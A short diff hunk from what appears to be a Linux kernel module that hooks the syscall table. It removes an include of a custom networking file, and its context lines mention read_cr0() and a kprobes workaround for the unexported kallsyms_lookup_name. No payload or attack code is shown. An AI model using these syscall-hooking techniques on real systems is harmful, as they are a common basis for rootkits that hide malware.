@@ -7,7 +7,6 @@ library for the hooking via the syscall table
 #include <asm/paravirt.h> //contains functions for read_cr0()
 #include <linux/kprobes.h> //kprobes- used in workaround for kallsyms_lookup_name not exported
 
-#include <custom/networking.c>
 
 //syscalls in new kernel use pt_regs struct for information, so is generic fnction type for syscalls
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
